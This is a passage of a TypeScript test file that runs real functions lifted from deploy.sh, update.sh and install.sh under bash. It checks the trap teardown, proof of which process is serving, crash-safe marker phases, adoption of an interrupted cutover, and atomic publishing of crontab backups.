  test(`${entry.name}'s trap still tears down a POST-stop failure — the pre-stop branch is not a hole`, () => {
    // The control. Without it, a trap that did nothing at all would pass the test above.
    const result = runTrapHarness(
      entry,
      ['CUTOVER_ARMING=true', 'FENCE_ARMED=true', 'CRON_FENCED=true', 'CRON_BACKUP_CREATED=true'].join('\n'),
    )

    assert.match(result.log, /systemctl stop/, 'a failure after the stop must re-stop what may have come back')
    assert.match(result.log, /install_reboot_fence/, 'and re-establish the reboot fence')
    assert.ok(
      !/crontab-stdin: /.test(result.log),
      'and it must NOT hand the cron writers back to a host with nothing serving',
    )
    assert.equal(result.markerExists, true, 'the marker stays: the next run adopts it')
    assert.match(result.stdout, /AFTER THE STOP/, 'and the banner says so')
    assert.match(result.stdout, /TRAP_EXIT=7/, 'the trap must run to its end and preserve the failure status')
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r7, HIGH) — THE DEV-SERVER EXCEPTION REPORTED SUCCESS WITHOUT
// IDENTIFYING THE RESPONDER.
//
// When DEV_SERVER_UNIT was inferred from a selected unit, failing to serve the new
// BUILD_ID asset only WARNED: the script then cleared the fence, restored cron, set
// DEPLOY_OK and reported a complete deploy with NEW_BUILD_SERVING still false. But
// DEV_SERVER_UNIT describes the launcher the run intended to start, not the process that
// answered the port — so a stale or unrelated listener that won the post-release race
// passed the health check and was left serving the migrated schema.
//
// r6's lesson stands: the dev path may only be made fatal on evidence that actually
// distinguishes this host's real dev server from a stale listener, which a build id cannot.
// The evidence is the listener itself — its unit, its working tree, and its age.
// ---------------------------------------------------------------------------

test('deploy.sh does not finish a dev-server deploy over an unidentified responder', () => {
  const source = DEPLOY_LINES.filter(isCode).join('\n')

  assert.ok(
    !/warn "Cannot prove which build is answering/.test(source),
    'the bare warning that completed the deploy without identifying anything must be gone',
  )
  assert.match(source, /^prove_dev_responder\(\) \{$/m, 'the dev path must have a proof of its own')

  // The proof flag is set by the proof and by nothing else.
  const lines = DEPLOY_LINES
  const armed = lines
    .map((line, index) => ({ line, index }))
    .filter((entry) => isCode(entry.line) && /^\s*DEV_RESPONDER_PROVEN=true\s*$/.test(entry.line))
  assert.equal(armed.length, 1, 'exactly one place may establish the dev-server proof')
  let previous = armed[0].index - 1
  while (previous >= 0 && !isCode(lines[previous])) previous -= 1
  assert.match(
    lines[previous],
    /^\s*if prove_dev_responder; then\s*$/,
    'and it must be the branch where prove_dev_responder returned zero',
  )

  // Unproven is fatal, and the fences are still armed when it fires: the die is before
  // FENCE_ARMED=false, which is the line that ends the teardown window.
  const die = lines.findIndex((line) => isCode(line) && /die "A development server was expected/.test(line))
  assert.notEqual(die, -1, 'an unidentified responder on the dev path must be fatal')
  const disarm = lines.findIndex((line, index) => index > die && isCode(line) && /^FENCE_ARMED=false$/.test(line))
  assert.notEqual(disarm, -1, 'the teardown window must still be open when it fires')

  // And the point of no return is armed by that proof, not by the unit's kind.
  const arm = lines.findIndex((line) => isCode(line) && /^\s*PAST_POINT_OF_NO_RETURN=true\s*$/.test(line))
  previous = arm - 1
  while (previous >= 0 && !isCode(lines[previous])) previous -= 1
  assert.match(lines[previous], /\$DEV_RESPONDER_PROVEN/, 'the dev proof is what arms it on that path')
  assert.ok(
    !/\$DEV_SERVER_UNIT[^\n]*\|\|[^\n]*PAST_POINT_OF_NO_RETURN|PAST_POINT_OF_NO_RETURN=true[^\n]*DEV_SERVER_UNIT/.test(source),
    'and being a dev unit must never arm it on its own',
  )
})

/**
 * prove_dev_responder(), run for real against real processes and real /proc data.
 *
 * `port_pid` is stubbed — the point is not whether `ss` works — and `systemctl` answers
 * ControlGroup/MainPID from the fixture. Everything that decides is the shipped code
 * reading /proc for a process this test actually started.
 */
function runResponderProof(options: {
  appDir: string
  pid: number
  cgroup: string
  mainPid: number
  startEpoch: number
}): boolean {
  const source = DEPLOY_LINES.join('\n')
  const program = [
    'set -uo pipefail',
    "YELLOW=''; RED=''; GREEN=''; BOLD=''; RESET=''",
    'warn(){ :; }',
    'ok(){ :; }',
    'PORT=3000',
    `APP_DIR_REAL='${options.appDir}'`,
    'SERVICE_UNITS=(app.service)',
    `SERVICE_START_EPOCH=${options.startEpoch}`,
    'DEV_RESPONDER_CLOCK_SLACK=5',
    'RESPONDER_UNIT=""',
    `STUB_CGROUP='${options.cgroup}'`,
    `STUB_MAINPID=${options.mainPid}`,
    'systemctl(){ case "$*" in *ControlGroup*) echo "$STUB_CGROUP" ;; *MainPID*) echo "$STUB_MAINPID" ;; esac; return 0; }',
    `port_pid(){ echo ${options.pid}; }`,
    shellFunction(source, 'proc_start_epoch'),
    shellFunction(source, 'pid_in_unit_cgroup'),
    shellFunction(source, 'pid_in_unit_process_tree'),
    shellFunction(source, 'prove_dev_responder'),
    'if prove_dev_responder; then echo PROVEN; else echo UNPROVEN; fi',
  ].join('\n')
  const out = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
  return out.trim().endsWith('PROVEN') && !out.trim().endsWith('UNPROVEN')
}

test('prove_dev_responder identifies the process on the port, and rejects the ways it can be the wrong one', () => {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'ims-responder-')))
  const listener = spawn('sleep', ['30'], { cwd: dir, stdio: 'ignore' })
  const other = spawn('sleep', ['30'], { cwd: dir, stdio: 'ignore' })
  try {
    const pid = listener.pid as number
    const cgroup = (readFileSync(`/proc/${pid}/cgroup`, 'utf8').split('\n')[0] ?? '').replace(/^\d+::/, '')
    const now = Math.floor(Date.now() / 1000)

    // The positive control, and it has to pass: a check that can only ever fail would make
    // every negative below vacuous — and a dev unit that can never complete is the r6 outage.
    assert.equal(
      runResponderProof({ appDir: dir, pid, cgroup, mainPid: other.pid as number, startEpoch: now - 3600 }),
      true,
      'a listener in the restarted unit, in the app directory, younger than the restart, is the responder',
    )

    assert.equal(
      runResponderProof({ appDir: '/opt/some-other-tree', pid, cgroup, mainPid: other.pid as number, startEpoch: now - 3600 }),
      false,
      'a listener serving a DIFFERENT working tree is not this deploy (a dev server compiles from its cwd)',
    )

    assert.equal(
      runResponderProof({
        appDir: dir,
        pid,
        cgroup: '/system.slice/something-else.service',
        mainPid: other.pid as number,
        startEpoch: now - 3600,
      }),
      false,
      'a listener that belongs to no unit this run restarted is not this deploy',
    )

    assert.equal(
      runResponderProof({ appDir: dir, pid, cgroup, mainPid: other.pid as number, startEpoch: now + 3600 }),
      false,
      'a listener that predates the restart survived the stop, whatever else is true of it',
    )
  } finally {
    listener.kill('SIGKILL')
    other.kill('SIGKILL')
    rmSync(dir, { recursive: true, force: true })
  }
})

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r7, HIGH) — AND THE RUNBOOK ASSERTED A GUARANTEE THE CODE DID NOT
// DELIVER. docs/installation.md said all three scripts require positive proof, that a
// build-id mismatch is FATAL and that absence of proof fails the deploy. None of it was
// true on deploy.sh's dev path, and the "mismatch is fatal" line had been wrong about the
// code since r6 reverted it. A document is not a guarantee; this test ties the two.
// ---------------------------------------------------------------------------

test('docs/installation.md describes the build-id policy deploy.sh actually implements', () => {
  const doc = readFileSync(join(process.cwd(), 'docs/installation.md'), 'utf8')
  const source = DEPLOY_LINES.filter(isCode).join('\n')

  // The code's actual policy: a scraped mismatch warns.
  assert.ok(!/die "Served BUILD_ID/.test(source) && !/die "The build id scraped/.test(source), 'precondition: a scraped mismatch is not fatal')
  assert.ok(
    !/mismatch is\s+\*\*fatal\*\*/.test(doc),
    'the runbook must not promise a fatal build-id mismatch that deploy.sh warns about',
  )

  // The escape hatch the runbook names must be one the script reads.
  const documentedHatch = /IMS_ALLOW_UNIDENTIFIED_DEV_RESPONDER/.test(doc)
  assert.equal(documentedHatch, true, 'the dev path is fatal, so the runbook must document the one deliberate way past it')
  assert.match(
    source,
    /\$\{IMS_ALLOW_UNIDENTIFIED_DEV_RESPONDER:-/,
    'and the script must actually READ it from the environment, not merely name it in a message',
  )

  // And the phase model the trap implements must be the one the runbook describes.
  assert.match(doc, /CUTOVER_ARMING/, 'the runbook must describe the reversible pre-stop phase')
  assert.match(DEPLOY_LINES.join('\n'), /^CUTOVER_ARMING=false$/m, 'which the script must have')
})

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r8) — ROUND TWO ON THE PHASE STATE MACHINE.
//
// Three defects, all of them in the machine the previous round introduced:
//
//   HIGH   the reboot-fence marker is written during ARMING, before the first stop, and
//          adoption treated its mere EXISTENCE as proof the predecessor had been stopped.
//          A kill between install_reboot_fence() and that stop therefore cost the NEXT run
//          a stop of a healthy service over an untouched schema.
//   HIGH   the crontab backup was created before the flag saying THIS run owns it, so a
//          partial write or a failed chmod left a truncated file at the authoritative path
//          that the arming unwind disowned and a later run adopted as verbatim.
//   MEDIUM the escape hatch cleared both phase flags before its own cleanup, so a failure
//          in that cleanup matched none of the trap's branches and tore nothing down.
//
// Everything below runs the REAL functions and the REAL top-level blocks under bash. The
// controls are load-bearing: without them an implementation that resumed everything, or one
// whose trap did nothing at all, would pass.
// ---------------------------------------------------------------------------

/** The extra variables each script's marker writer and adoption block need beyond the trap preamble. */
const R8_EXTRA_STATE: Record<string, string> = {
  'deploy.sh': `
SKIP_MIGRATE=false
SKIP_MIGRATE_FLAG='--skip-migrate'
HEALTH_URL='http://127.0.0.1:3000/api/health'
CRON_FENCED=false
CRON_BACKUP_CREATED=false
NEW_BUILD_SERVING=false
DEV_RESPONDER_PROVEN=false
DEPLOY_ADMIN_DATABASE_URL='postgres://admin@localhost/app'
MIGRATION_DATABASE_URL=''
`,
  'update.sh': `
DRY_RUN=false
CRON_FENCED=false
CRON_BACKUP_CREATED=false
FENCE_MASK=false
APP_DIR=/opt/app
DEPLOY_ADMIN_DATABASE_URL='postgres://admin@localhost/app'
MIGRATION_DATABASE_URL=''
`,
  'install.sh': `
APP_DIR=/opt/app
APP_PORT=39997
CRON_FENCED=false
CRON_BACKUP_CREATED=false
FENCE_MASK=false
DEPLOY_ADMIN_DATABASE_URL='postgres://admin@localhost/app'
MIGRATION_DATABASE_URL=''
DATABASE_URL='postgres://app@localhost/app'
`,
}

/** Stubs for everything the adoption path calls that is NOT the subject. */
const R8_STUBS = `
FENCE_ARMED=\${FENCE_ARMED:-false}
die(){ echo "DIE: $*" >&2; exit 9; }
step(){ :; }
header(){ :; }
run(){ "$@"; }
ss(){ return 1; }
PREDECESSOR_ACTIVE=false
systemctl(){
  echo "systemctl $*" >> "\${LOG}"
  if [[ "\${1:-}" == "is-active" ]]; then \${PREDECESSOR_ACTIVE}; return $?; fi
  return 0
}
adopt_cron_fence(){ echo "adopt_cron_fence" >> "\${LOG}"; CRON_FENCED=true; return 0; }
fence_cron(){ echo "fence_cron" >> "\${LOG}"; CRON_FENCED=true; return 0; }
adopt_db_connections(){ echo "adopt_db_connections" >> "\${LOG}"; DB_FENCE_UP=true; return 0; }
fence_db_connections(){ echo "fence_db_connections" >> "\${LOG}"; DB_FENCE_UP=true; MIGRATION_DATABASE_URL='postgres://x'; return 0; }
# o3d-2sm1.5 r29: where the adoption's connection identity comes from. Not the subject of these
# harnesses — they are about the PHASE the marker records and what the adoption does about it —
# and it is exercised against real files in 'a deleted .env does not stop the connection fence
# being adopted'.
DB_FENCE_IDENTITY_FILE='/etc/ims-cutover-recovery/db-fence-identity.env'
DB_FENCE_RECOVERY_REASON=''
DB_FENCE_ADOPTING=false
require_adoption_identity(){ echo "require_adoption_identity" >> "\${LOG}"; return 0; }
# o3d-2sm1.5 r30: the refusal that fires when the app-owned .env and the root-owned record name
# different databases. Logged rather than stubbed silent, because WHETHER the adoption block asks
# it is part of the claim; what it answers is exercised against real files in 'an .env that names
# a different database than the record refuses the adoption'.
refuse_adoption_identity_mismatch(){ echo "refuse_adoption_identity_mismatch $*" >> "\${LOG}"; return 0; }
`

const R8_CASES = ARMING_TRAP_CASES.map((entry) => ({
  ...entry,
  writer: entry.name === 'install.sh' ? 'write_cutover_marker' : 'write_fence_marker',
  extra: R8_EXTRA_STATE[entry.name],
}))

// ---------------------------------------------------------------------------
// FINDING 1a — the marker records the phase, and records it separately from the intent.
// ---------------------------------------------------------------------------
function runMarkerWriter(entry: (typeof R8_CASES)[number], state: string): string {
  const { outer, dir } = anchoredStateDir('ims-r8-marker-')
  try {
    const program = [
      'set -euo pipefail',
      entry.preamble(dir),
      TRAP_STUBS,
      entry.extra,
      R8_STUBS,
      durabilityFunctions(entry.source),
      shellFunction(entry.source, entry.writer),
      state,
      `${entry.writer} "under test"`,
      'cat "${FENCE_FILE}"',
    ].join('\n')
    return execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
  } finally {
    rmSync(outer, { recursive: true, force: true })
  }
}

for (const entry of R8_CASES) {
  test(`${entry.name} records the phase it is actually in, not the intent to migrate`, () => {
    // ARMING: reversible state exists, nothing has been stopped. `migration_attempted` is
    // ALREADY true here — that is precisely why it could never have carried this answer.
    const arming = runMarkerWriter(entry, ['CUTOVER_ARMING=true', 'FENCE_ARMED=false', 'FENCE_MASK=true', 'SCHEMA_TOUCHED=false'].join('\n'))
    assert.match(arming, /^phase=arming$/m, `${entry.name} must record phase=arming before it has stopped anything:\n${arming}`)
    assert.match(
      arming,
      /^migration_attempted=true$/m,
      'and it must still say a migration is intended — the phase is a SEPARATE fact, not a re-spelling of the mask',
    )
    assert.match(arming, /^schema_touched=false$/m, 'and the schema has not moved')

    // STOPPING: a stop has been attempted. Same mask, different phase.
    const stopping = runMarkerWriter(entry, ['CUTOVER_ARMING=true', 'FENCE_ARMED=true', 'FENCE_MASK=true', 'SCHEMA_TOUCHED=false'].join('\n'))
    assert.match(stopping, /^phase=stopping$/m, `${entry.name} must record phase=stopping once a stop has been attempted:\n${stopping}`)
    assert.match(
      stopping,
      /^migration_attempted=true$/m,
      'install.sh used to write this line from FENCE_ARMED — the stop flag — so it was the phase under another name, and false for the whole arming phase',
    )
  })
}

// ---------------------------------------------------------------------------
// FINDING 1b — adoption, run for real, in the state an interrupted arming leaves behind.
// ---------------------------------------------------------------------------

/**
 * The top-level adoption block, lifted out of the script verbatim.
 *
 * deploy.sh and update.sh decide this inline rather than in a function, so the block is
 * located by its own first statement and taken from the enclosing `if [[ -f FENCE_FILE ]]`
 * to the `fi` that closes it in column 0. install.sh has it as adopt_existing_fence().
 */
function adoptionBlock(source: string): string {
  const lines = source.split(/\r?\n/)
  const anchor = lines.findIndex((line) => /ADOPTED_PHASE="\$\(marker_phase\)"/.test(line))
  assert.notEqual(anchor, -1, 'the adoption block must read the marker phase before it decides anything')
  let start = anchor
  while (start >= 0 && !/^if \[\[ -f "\$\{?FENCE_FILE\}?" \]\]; then$/.test(lines[start])) start -= 1
  assert.ok(start >= 0, 'the adoption block must be guarded by the existence of the marker')
  let end = anchor
  while (end < lines.length && lines[end] !== 'fi') end += 1
  assert.ok(end < lines.length, 'the adoption block must be closed by a fi in column 0')
  return lines.slice(start, end + 1).join('\n')
}

function adoptionProgram(entry: (typeof R8_CASES)[number], dir: string, state: string): string {
  const isInstall = entry.name === 'install.sh'
  const parts = [
    'set -euo pipefail',
    entry.preamble(dir),
    TRAP_STUBS,
    `FAKE_LIVE_CRONTAB='${join(dir, 'live-crontab')}'`,
    entry.extra,
    R8_STUBS,
    // Stubbed because they reach the network, a database or /etc — never because they are
    // the subject. Everything the finding is about is the REAL function below.
    'install_reboot_fence(){ echo "install_reboot_fence $*" >> "${LOG}"; REBOOT_FENCE_INSTALLED=true; return 0; }',
    'release_db_connections(){ echo "release_db_connections" >> "${LOG}"; DB_FENCE_UP=false; return 0; }',
  ]
  if (entry.name === 'deploy.sh') {
    // The drop-in path is the only thing redirected: the real one is under /etc.
    parts.push('fence_dropin_file(){ echo "${FENCE_DROPIN_DIR}/${FENCE_DROPIN_NAME}"; }')
  }
  parts.push(
    // o3d-secops r20: adoption now asks whether the marker is one this run may believe — a regular
    // file it owns, inside a directory only it can write — before it reads a line of it. Lifted, not
    // stubbed: a stub would make every adoption test pass over a marker anybody could have planted.
    shellFunction(entry.source, 'fence_marker_is_trustworthy'),
    shellFunction(entry.source, 'marker_is_complete'),
    shellFunction(entry.source, 'marker_phase'),
    shellFunction(entry.source, 'predecessor_is_active'),
    shellFunction(entry.source, 'remove_reboot_fence'),
    shellFunction(entry.source, 'resume_restore_cron_locked'),
    shellFunction(entry.source, 'resume_from_interrupted_arming'),
  )
  if (isInstall) parts.push(shellFunction(entry.source, 'adopt_existing_fence'))
  parts.push(state)
  parts.push(isInstall ? 'adopt_existing_fence' : adoptionBlock(entry.source))
  parts.push('echo "AFTER_FENCE_ARMED=${FENCE_ARMED}"')
  parts.push('echo "AFTER_SCHEMA_TOUCHED=${SCHEMA_TOUCHED}"')
  return parts.join('\n')
}

function runAdoption(
  entry: (typeof R8_CASES)[number],
  marker: string,
  state: string,
): { log: string; stdout: string; status: number; markerExists: boolean; dropinExists: boolean; backupExists: boolean } {
  const { outer, dir } = anchoredStateDir('ims-r8-adopt-')
  try {
    const dropinDir = join(dir, 'dropin')
    execFileSync('mkdir', ['-p', dropinDir])
    // Exactly what an interrupted arming leaves on disk: the marker, the drop-in it had just
    // written, and the crontab backup it had just taken.
    writeFileSync(join(dir, 'FENCED'), marker)
    writeFileSync(join(dropinDir, 'zz-deploy-fence.conf'), '[Unit]\n')
    writeFileSync(join(dir, 'crontab.bak'), '*/5 * * * * /usr/bin/true\n')
    // …and the crontab as that run left it: FENCED. An interrupted ARMING is by definition a run
    // that got as far as commenting the crontab out, so the live crontab is the fence's own
    // projection of the backup beside it — which is what makes "nothing has written it since"
    // true, and what the resume now proves before installing the snapshot (o3d-p9dq, Codex r28).
    writeFileSync(join(dir, 'live-crontab'), '#DEPLOY-FENCE# */5 * * * * /usr/bin/true\n')
    // AND THE CONNECTION-FENCE RECORD (o3d-2sm1.5, Codex r12). A fence that is STANDING has a
    // record; the fixture used to omit it, so install.sh's inline adoption skipped its whole
    // held-fence branch on a missing file and the "must NOT release" assertions below were
    // satisfied by a branch that never ran. The missing-record case is now its own scenario,
    // asserted separately, because it no longer means "there was never a fence".
    writeFileSync(join(dir, 'db.json'), '{"database":"imsdb","revoked":["PUBLIC"]}\n')

    let stdout = ''
    let status = 0
    try {
      stdout = execFileSync('bash', ['-c', adoptionProgram(entry, dir, state)], {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'pipe'],
      })
    } catch (error) {
      const err = error as { status?: number; stdout?: string; stderr?: string }
      status = err.status ?? -1
      stdout = `${err.stdout ?? ''}${err.stderr ?? ''}`
    }
    return {
      log: readFileSync(join(dir, 'calls.log'), 'utf8'),
      stdout,
      status,
      markerExists: existsSync(join(dir, 'FENCED')),
      dropinExists: existsSync(join(dropinDir, 'zz-deploy-fence.conf')),
      backupExists: existsSync(join(dir, 'crontab.bak')),
    }
  } finally {
    rmSync(outer, { recursive: true, force: true })
  }
}

/**
 * A marker as publish_durable_file() leaves it: complete, and saying so on its last line.
 *
 * Adoption now treats the ABSENCE of that line as "the schema may have moved", so a fixture
 * that omits it is testing the truncated-marker path, not the ordinary one. Every fixture
 * below is explicit about which of the two it is.
 */
function completeMarker(body: string): string {
  return `${body}marker_complete=1\n`
}

const ARMING_MARKER = completeMarker('phase=arming\nmigration_attempted=true\nschema_touched=false\nreboot_fence=installed\n')
const STOPPING_MARKER = completeMarker('phase=stopping\nmigration_attempted=true\nschema_touched=false\nreboot_fence=installed\n')

for (const entry of R8_CASES) {
  test(`${entry.name} resumes an interrupted arming instead of stopping a predecessor nobody stopped`, () => {
    const result = runAdoption(entry, ARMING_MARKER, 'PREDECESSOR_ACTIVE=true')

    assert.equal(result.status, 0, `adoption must succeed:\n${result.stdout}`)
    assert.ok(
      !/systemctl stop/.test(result.log),
      `a marker written during ARMING is not evidence of a stop — the run did: ${result.log}`,
    )
    assert.ok(
      !/install_reboot_fence/.test(result.log),
      'nor may it re-establish a reboot fence it is about to take down',
    )
    assert.ok(!/adopt_db_connections/.test(result.log), 'nor hold a connection fence over a schema that never moved')
    assert.match(result.log, /release_db_connections/, 'the connection fence, if any, is released')
    assert.match(
      result.log,
      /crontab-stdin: \*\/5 \* \* \* \* \/usr\/bin\/true/,
      'the crontab the interrupted run fenced must be restored from its own backup',
    )
    assert.equal(result.backupExists, false, 'and the backup consumed')
    assert.equal(result.markerExists, false, 'the reversible reboot-fence marker must be removed, or the next boot is refused')
    assert.equal(result.dropinExists, false, 'and so must the drop-in')
    assert.match(result.stdout, /INTERRUPTED ARMING/, 'and the operator must be told which kind of adoption this was')
    assert.match(result.stdout, /AFTER_FENCE_ARMED=false/, 'nothing was stopped, so the stopping phase must NOT be entered')
  })

  test(`${entry.name} still stops and re-fences when the marker says the stop already happened`, () => {
    // THE CONTROL. Without it an adoption that resumed unconditionally would pass the test
    // above, and the defect would be traded for a strictly worse one: a predecessor left
    // running over a schema that may be half-migrated.
    const result = runAdoption(entry, STOPPING_MARKER, 'PREDECESSOR_ACTIVE=true')

    assert.equal(result.status, 0, `adoption must succeed:\n${result.stdout}`)
    assert.match(result.log, /systemctl stop/, 'a marker from a run that had stopped must be adopted by re-stopping')
    assert.match(result.log, /install_reboot_fence/, 'and by re-establishing the reboot fence')
    assert.equal(result.markerExists, true, 'the marker stays: this run owns the fence now')
    assert.match(result.stdout, /AFTER_FENCE_ARMED=true/, 'and the stopping phase is entered')
  })

  test(`${entry.name} does not resume an arming whose schema had already been touched`, () => {
    const result = runAdoption(
      entry,
      completeMarker('phase=arming\nmigration_attempted=true\nschema_touched=true\n'),
      'PREDECESSOR_ACTIVE=true',
    )

    assert.match(
      result.log,
      /systemctl stop/,
      'a half-applied schema is not resumable however early the phase claims to be — the marker is flushed before prisma runs, so schema_touched wins',
    )
    assert.ok(
      !/release_db_connections/.test(result.log),
      `and the connection fence is HELD, not released — the run did: ${result.log}`,
    )
    if (entry.name !== 'install.sh') {
      // install.sh re-fences through fence_db_connections and only when a fence state file
      // is present; the other two carry a dedicated adoption path.
      assert.match(result.log, /adopt_db_connections/, 'through the admin connection this run recovers with')
    }
    assert.match(result.stdout, /AFTER_SCHEMA_TOUCHED=true/, 'and the fact is carried forward')
  })

  test(`${entry.name} does not resume an arming whose predecessor is no longer running`, () => {
    // A reboot between the fence install and the stop: the drop-in did its job and the unit
    // is down. There is nothing to leave running, so the ordinary adoption is correct.
    const result = runAdoption(entry, ARMING_MARKER, 'PREDECESSOR_ACTIVE=false')

    assert.match(result.log, /systemctl stop/, 'with nothing serving, adoption must take the ordinary path')
    assert.match(result.log, /install_reboot_fence/, 'and re-establish the fence')
    assert.equal(result.markerExists, true, 'and keep the marker')
  })

  test(`${entry.name} reads a marker with no phase line as a completed stop`, () => {
    // Every older version of these scripts only ever left a marker behind AFTER a stop, so
    // the absent-phase reading has to be the one that stops rather than the one that leaves
    // a service running over a schema that may have moved.
    const result = runAdoption(entry, completeMarker('migration_attempted=true\nschema_touched=false\n'), 'PREDECESSOR_ACTIVE=true')

    assert.match(result.log, /systemctl stop/, 'an unrecognised phase must be adopted conservatively')
    assert.equal(result.markerExists, true, 'and the fence kept')
  })
}

// ---------------------------------------------------------------------------
// FINDING 2 — a failed cron-backup write must not become an authoritative backup.
//
// The file used to be created BEFORE the flag saying this run owns it, so a short write or a
// failed chmod left a truncated file at the authoritative path that the arming unwind
// disowned and a later run adopted as the previous run's verbatim original. A successful
// unfence then replaced the real crontab with those contents.
// ---------------------------------------------------------------------------

/**
 * publish_cron_backup(), run for real, with one thing broken at a time.
 *
 * `shim` is bash injected immediately before the call: `printf` and `chmod` are shadowed by
 * functions there, which is how a partial write and a permissions failure are produced
 * without a full disk or a read-only mount.
 */
function runPublishCronBackup(
  entry: (typeof R8_CASES)[number],
  shim: string,
  content = '*/5 * * * * /usr/bin/true\n#DEPLOY-FENCE# kept',
): { status: number; stdout: string; published: string | null; mode: string | null; leftovers: string[] } {
  const dir = mkdtempSync(join(tmpdir(), 'ims-r8-cron-'))
  try {
    const program = [
      'set -euo pipefail',
      entry.preamble(dir),
      TRAP_STUBS,
      entry.extra,
      R8_STUBS,
      durabilityFunctions(entry.source),
      shellFunction(entry.source, 'publish_cron_backup'),
      'CRON_BACKUP_CREATED=false',
      shim,
      'RC=0',
      `publish_cron_backup "$(cat "${dir}/content.txt")" || RC=$?`,
      'echo "RC=${RC}"',
      'echo "CRON_BACKUP_CREATED=${CRON_BACKUP_CREATED}"',
    ].join('\n')
    writeFileSync(join(dir, 'content.txt'), content)
    let stdout = ''
    let status = 0
    try {
      stdout = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
    } catch (error) {
      const err = error as { status?: number; stdout?: string; stderr?: string }
      status = err.status ?? -1
      stdout = `${err.stdout ?? ''}${err.stderr ?? ''}`
    }
    const backup = join(dir, 'crontab.bak')
    // Anything at all left next to the backup path: a stray temporary is not a correctness
    // bug, but a stray temporary NAMED like the backup would be adopted by the next run.
    const leftovers = execFileSync('bash', ['-c', `ls -1 "${dir}" | grep '^crontab' || true`], { encoding: 'utf8' })
      .split('\n')
      .filter(Boolean)
    return {
      status,
      stdout,
      published: existsSync(backup) ? readFileSync(backup, 'utf8') : null,
      mode: existsSync(backup) ? execFileSync('stat', ['-c', '%a', backup], { encoding: 'utf8' }).trim() : null,
      leftovers,
    }
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

for (const entry of R8_CASES) {
  test(`${entry.name} publishes the crontab backup atomically and owns it the moment it exists`, () => {
    const ok = runPublishCronBackup(entry, ':')
    assert.match(ok.stdout, /RC=0/, `a clean publish must succeed:\n${ok.stdout}`)
    assert.equal(
      ok.published,
      '*/5 * * * * /usr/bin/true\n#DEPLOY-FENCE# kept\n',
      'and the backup must be the crontab verbatim, comment lines and all',
    )
    assert.equal(ok.mode, '600', 'and readable only by root')
    assert.match(
      ok.stdout,
      /CRON_BACKUP_CREATED=true/,
      'and owned by THIS run — an unowned backup is one the arming unwind refuses to restore from',
    )
    assert.deepEqual(ok.leftovers, ['crontab.bak'], `no temporary file may survive a successful publish: ${ok.leftovers}`)
  })

  test(`${entry.name} leaves NOTHING at the backup path when the write is short`, () => {
    // The exact shape of the defect: a partial write. `printf` is shadowed so the file on
    // disk is not what was asked for.
    const short = runPublishCronBackup(entry, `printf(){ builtin printf '%s' 'TRUNCATED'; }`)

    assert.ok(short.status === 0, 'the harness itself must not die')
    assert.match(short.stdout, /RC=1/, `a short write must be reported, not published:\n${short.stdout}`)
    assert.equal(
      short.published,
      null,
      'a truncated backup at the authoritative path is the whole defect: a later run adopts it as verbatim and a successful unfence replaces the real crontab with it',
    )
    assert.match(short.stdout, /CRON_BACKUP_CREATED=false/, 'and nothing may claim to own it')
    assert.deepEqual(short.leftovers, [], `and no temporary may be left behind: ${short.leftovers}`)
  })

  test(`${entry.name} leaves NOTHING at the backup path when the permissions cannot be set`, () => {
    const denied = runPublishCronBackup(entry, `chmod(){ return 1; }`)

    assert.match(denied.stdout, /RC=1/, `a failed chmod must be reported, not published:\n${denied.stdout}`)
    assert.equal(denied.published, null, 'a world-readable crontab backup is not a backup this script publishes')
    assert.match(denied.stdout, /CRON_BACKUP_CREATED=false/, 'and nothing may claim to own it')
    assert.deepEqual(denied.leftovers, [], `and no temporary may be left behind: ${denied.leftovers}`)
  })

  test(`${entry.name} publishes cleanly on the retry after a failed attempt`, () => {
    // The failure and then the fix, in one process: the second call must find no wreckage
    // from the first and must publish the real thing.
    const retry = runPublishCronBackup(
      entry,
      [
        `printf(){ builtin printf '%s' 'TRUNCATED'; }`,
        'RC1=0',
        'publish_cron_backup "$(cat "$(dirname "${CRON_BACKUP}")/content.txt")" || RC1=$?',
        'echo "FIRST_RC=${RC1}"',
        'unset -f printf',
      ].join('\n'),
    )
    assert.match(retry.stdout, /FIRST_RC=1/, 'the first attempt must fail')
    assert.match(retry.stdout, /RC=0/, `and the retry must succeed:\n${retry.stdout}`)
    assert.equal(retry.published, '*/5 * * * * /usr/bin/true\n#DEPLOY-FENCE# kept\n', 'with the real crontab, not the wreckage')
    assert.match(retry.stdout, /CRON_BACKUP_CREATED=true/, 'and owned by this run')
    assert.deepEqual(retry.leftovers, ['crontab.bak'], `and no temporary from either attempt: ${retry.leftovers}`)
  })

  test(`${entry.name} refuses to fence the cron writers when the backup cannot be published`, () => {
    // And the wiring: a backup that cannot be verified must stop the run INSIDE the arming
    // phase, where the trap unwinds it with nothing stopped — not fence a crontab nobody
    // can put back.
    const dir = mkdtempSync(join(tmpdir(), 'ims-r8-fence-'))
    try {
      const program = [
        'set -euo pipefail',
        entry.preamble(dir),
        TRAP_STUBS,
        entry.extra,
        R8_STUBS,
        'crontab(){ if [[ "${3:-}" == "-l" ]]; then echo "*/5 * * * * /usr/bin/true"; else echo "crontab $*" >> "${LOG}"; fi; return 0; }',
        durabilityFunctions(entry.source),
        shellFunction(entry.source, 'publish_cron_backup'),
        shellFunction(entry.source, 'fence_cron_locked'),
        shellFunction(entry.source, 'fence_cron'),
        'CRON_FENCED=false',
        'CRON_BACKUP_CREATED=false',
        `printf(){ builtin printf '%s' 'TRUNCATED'; }`,
        'RC=0',
        'fence_cron || RC=$?',
        'unset -f printf',
        'echo "RC=${RC}"',
        'echo "CRON_FENCED=${CRON_FENCED}"',
      ].join('\n')
      let stdout = ''
      let status = 0
      try {
        stdout = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
      } catch (error) {
        const err = error as { status?: number; stdout?: string; stderr?: string }
        status = err.status ?? -1
        stdout = `${err.stdout ?? ''}${err.stderr ?? ''}`
      }
      const log = readFileSync(join(dir, 'calls.log'), 'utf8')
